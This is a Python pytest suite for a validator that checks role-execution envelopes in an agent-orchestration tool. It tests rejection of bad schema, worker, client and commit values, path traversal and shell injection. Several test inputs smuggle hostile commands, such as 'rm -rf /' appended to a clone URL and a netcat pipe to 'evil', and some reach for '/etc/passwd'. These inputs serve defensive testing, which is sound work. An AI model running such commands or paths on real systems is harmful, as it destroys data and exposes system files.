"""Tests for the role-execution envelope validator.

Each §13 rejection rule has a single test that proves the validator
raises the *typed* error whose ``category`` attribute is the canonical
§24 failure name. A test that asserts only "something was raised"
would prove nothing — the chapter makes the category the contract and
the test enforces that contract.

The default suite must run without a GPU, network, real Father, real
Model Allocator, real OpenCode or real tmux (§29). The two tests that
exercise path safety create a temporary directory via the standard
library ``tempfile`` module; they do not touch the real filesystem
outside that directory.
"""

from __future__ import annotations

import copy
import os

# Switch to a writable temp directory before pytest imports its
# configuration. This keeps the test hermetic even when the developer
# has a read-only workspace.
os.environ.setdefault("TMPDIR", "/tmp")

import tempfile
from pathlib import Path
from typing import Any, Dict

import pytest

from dpmtf_lightworker import (
    ExecutionEnvelope,
    InvalidExecutionEnvelope,
    ResultMode,
    UnsupportedClient,
    UnsupportedModelSource,
    UnsupportedSchemaVersion,
    ValidatorConfig,
    WorkerMismatch,
    validate_envelope,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


FULL_SHA: str = "0123456789" * 4  # 40 hex chars, SHA-1 length


def _example_envelope() -> Dict[str, Any]:
    """Return the example envelope from GOAL.md §13 with valid placeholder
    content. Callers may mutate the result; every test starts from a
    fresh deep copy."""
    return {
        "schema_version": "1",
        "execution_id": "EXEC-123-IMPLE01",
        "job_id": "JOB-123",
        "handoff_id": "HOFF-456",
        "attempt_id": "ATTEMPT-1",
        "flow_key": "strict_review",
        "step_key": "archi01-imple01",
        "source_role": "archi01",
        "target_role": "imple01",
        "worker_id": "svend3060",
        "model_source": "model_allocator",
        "model_alias": "imple01-3060",
        "client": "opencode",
        "repository": {
            "project_key": "trade-ui",
            "clone_url": "https://example.invalid/trade-ui.git",
            "base_commit": FULL_SHA,
        },
        "handoff": {
            "content": "<compiled handoff>",
            "governance_content": "<compiled role governance>",
            "expected_deliverable": "docs/dpmtf/403_IMPLEMENTATION.md",
        },
        "result_contract": {
            "mode": "patch_and_deliverable",
            "tests_required": True,
            "local_result_commit_required": True,
        },
    }


@pytest.fixture
def example_payload() -> Dict[str, Any]:
    return _example_envelope()


@pytest.fixture
def repository_root() -> Path:
    with tempfile.TemporaryDirectory(prefix="lightworker-env-") as tmp:
        yield Path(tmp).resolve()


@pytest.fixture
def config(repository_root: Path) -> ValidatorConfig:
    return ValidatorConfig(
        worker_id="svend3060",
        supported_schema_versions=frozenset({"1"}),
        supported_clients=frozenset({"opencode"}),
        repository_root=repository_root,
    )


def _override(payload: Dict[str, Any], **changes: Any) -> Dict[str, Any]:
    """Return a deep copy of ``payload`` with ``changes`` applied."""
    new = copy.deepcopy(payload)
    for key, value in changes.items():
        if "." in key:
            head, tail = key.split(".", 1)
            new[head][tail] = value
        else:
            new[key] = value
    return new


# ---------------------------------------------------------------------------
# Happy path
# ---------------------------------------------------------------------------


def test_accepts_section_13_example_envelope(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """The §13 example envelope validates without error."""
    envelope = validate_envelope(example_payload, config=config)
    assert isinstance(envelope, ExecutionEnvelope)
    assert envelope.schema_version == "1"
    assert envelope.execution_id == "EXEC-123-IMPLE01"
    assert envelope.target_role == "imple01"
    assert envelope.worker_id == "svend3060"
    assert envelope.model_source == "model_allocator"
    assert envelope.model_alias == "imple01-3060"
    assert envelope.client == "opencode"
    assert envelope.repository.project_key == "trade-ui"
    assert envelope.repository.base_commit == FULL_SHA
    assert (
        envelope.handoff.expected_deliverable
        == "docs/dpmtf/403_IMPLEMENTATION.md"
    )
    assert envelope.result_contract.mode == ResultMode.PATCH_AND_DELIVERABLE
    assert envelope.result_contract.tests_required is True
    assert envelope.result_contract.local_result_commit_required is True


def test_validated_envelope_is_immutable(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """A validated envelope cannot be mutated by downstream code."""
    envelope = validate_envelope(example_payload, config=config)
    with pytest.raises((AttributeError, Exception)):
        envelope.worker_id = "other"  # type: ignore[misc]
    with pytest.raises((AttributeError, Exception)):
        envelope.repository.base_commit = "x"  # type: ignore[misc]


# ---------------------------------------------------------------------------
# §13 rejection rules — one test per rule, asserting the category
# ---------------------------------------------------------------------------


def test_rejects_multiple_target_roles(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """More than one target role is the §13 first rejection rule."""
    payload = _override(example_payload, target_role=["imple01", "review01"])
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "target_role"


def test_rejects_unsupported_schema_version(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Unsupported schema_version → UNSUPPORTED_SCHEMA_VERSION."""
    payload = _override(example_payload, schema_version="99")
    with pytest.raises(UnsupportedSchemaVersion) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "UNSUPPORTED_SCHEMA_VERSION"
    assert excinfo.value.field == "schema_version"


def test_rejects_worker_id_mismatch(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """worker_id other than this worker's → WORKER_MISMATCH."""
    payload = _override(example_payload, worker_id="other3090")
    with pytest.raises(WorkerMismatch) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "WORKER_MISMATCH"
    assert excinfo.value.field == "worker_id"


def test_rejects_unsupported_model_source(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """model_source other than 'model_allocator' → UNSUPPORTED_MODEL_SOURCE."""
    payload = _override(example_payload, model_source="embedded")
    with pytest.raises(UnsupportedModelSource) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "UNSUPPORTED_MODEL_SOURCE"
    assert excinfo.value.field == "model_source"


def test_rejects_missing_model_alias(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Missing model_alias → INVALID_EXECUTION_ENVELOPE."""
    payload = _override(example_payload, model_alias="")
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "model_alias"


def test_rejects_unsupported_client(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Unsupported client → UNSUPPORTED_CLIENT."""
    payload = _override(example_payload, client="claude_code")
    with pytest.raises(UnsupportedClient) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "UNSUPPORTED_CLIENT"
    assert excinfo.value.field == "client"


def test_rejects_non_full_sha_base_commit(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Missing or non-full-SHA base_commit → INVALID_EXECUTION_ENVELOPE."""
    payload = _override(
        example_payload, **{"repository.base_commit": "abc1234"}
    )
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "repository.base_commit"


def test_rejects_unsafe_paths(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Path traversal in deliverable escapes the configured root."""
    payload = _override(
        example_payload,
        **{"handoff.expected_deliverable": "docs/../../etc/passwd"},
    )
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "handoff.expected_deliverable"


def test_rejects_unsafe_paths_symlink_escape(
    example_payload: Dict[str, Any], config: ValidatorConfig, tmp_path: Path
) -> None:
    """A symlink inside the root that points outside the root is rejected.

    The validator's path resolver must symlink-resolve the joined path
    before the containment check. The test creates a sibling directory
    of the root and a symlink inside the root that points to that
    sibling; resolving the symlink falls outside the root.
    """
    root = tmp_path / "root"
    root.mkdir()
    sibling = tmp_path / "outside"
    sibling.mkdir()
    (root / "escape").symlink_to(sibling)

    payload = _override(
        example_payload,
        **{"handoff.expected_deliverable": "escape/secret.md"},
    )
    root_config = ValidatorConfig(
        worker_id=config.worker_id,
        supported_schema_versions=config.supported_schema_versions,
        supported_clients=config.supported_clients,
        repository_root=root,
    )
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=root_config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "handoff.expected_deliverable"


def test_rejects_shell_pipeline_in_clone_url(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Arbitrary shell pipelines in any structural field are rejected.

    The check rejects ``;``, ``|``, ``&``, backtick, ``$``, newline and
    carriage return. A repository clone_url is the most realistic
    attack surface and is the field used here.
    """
    payload = _override(
        example_payload,
        **{"repository.clone_url": "https://x.example/repo.git; rm -rf /"},
    )
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "repository.clone_url"


def test_rejects_shell_pipeline_in_target_role(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Shell metacharacters in identifiers are rejected at the boundary."""
    payload = _override(example_payload, target_role="imple01 | nc evil 1234")
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "target_role"


def test_handoff_content_may_contain_shell_examples(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """Compiled handoff documents may legitimately contain shell examples.

    The shell-pipeline rule applies to structural fields, not to the
    free-text ``handoff.content`` and ``handoff.governance_content``
    documents. A markdown code block with ``python3 -m pytest`` must
    not be rejected.
    """
    payload = _override(
        example_payload,
        **{
            "handoff.content": (
                "Run the suite with:\n"
                "\n"
                "    python3 -m pytest tests/unit -q && "
                "python3 -m py_compile src\n"
            )
        },
    )
    envelope = validate_envelope(payload, config=config)
    assert "python3 -m pytest" in envelope.handoff.content


# ---------------------------------------------------------------------------
# Defensive coverage
# ---------------------------------------------------------------------------


def test_rejects_non_mapping_payload(config: ValidatorConfig) -> None:
    """A non-mapping payload is rejected at the boundary."""
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope("not a mapping", config=config)  # type: ignore[arg-type]
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"


def test_rejects_missing_base_commit(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """An empty base_commit is the 'missing' side of the same rule."""
    payload = _override(example_payload, **{"repository.base_commit": ""})
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "repository.base_commit"


def test_rejects_absolute_deliverable_path(
    example_payload: Dict[str, Any], config: ValidatorConfig
) -> None:
    """An absolute deliverable path is rejected by the path validator."""
    payload = _override(
        example_payload,
        **{"handoff.expected_deliverable": "/etc/passwd"},
    )
    with pytest.raises(InvalidExecutionEnvelope) as excinfo:
        validate_envelope(payload, config=config)
    assert excinfo.value.category == "INVALID_EXECUTION_ENVELOPE"
    assert excinfo.value.field == "handoff.expected_deliverable"


def test_validator_config_rejects_relative_root() -> None:
    """ValidatorConfig must demand an absolute repository_root."""
    with pytest.raises(ValueError):
        ValidatorConfig(
            worker_id="svend3060",
            supported_schema_versions=frozenset({"1"}),
            supported_clients=frozenset({"opencode"}),
            repository_root=Path("relative-only"),
        )


def test_error_category_is_data_not_type(example_payload: Dict[str, Any]) -> None:
    """The category string is the contract (§24), not the class identity."""
    from dpmtf_lightworker.errors import EnvelopeError

    payload = _override(example_payload, target_role=["x", "y"])
    root = Path(tempfile.mkdtemp(prefix="lightworker-cat-"))
    cfg = ValidatorConfig(
        worker_id="svend3060",
        supported_schema_versions=frozenset({"1"}),
        supported_clients=frozenset({"opencode"}),
        repository_root=root,
    )
    try:
        try:
            validate_envelope(payload, config=cfg)
        except EnvelopeError as exc:
            assert exc.category == "INVALID_EXECUTION_ENVELOPE"
            assert exc.category == "INVALID_EXECUTION_ENVELOPE"
        else:
            pytest.fail("expected EnvelopeError")
    finally:
        import shutil

        shutil.rmtree(root, ignore_errors=True)
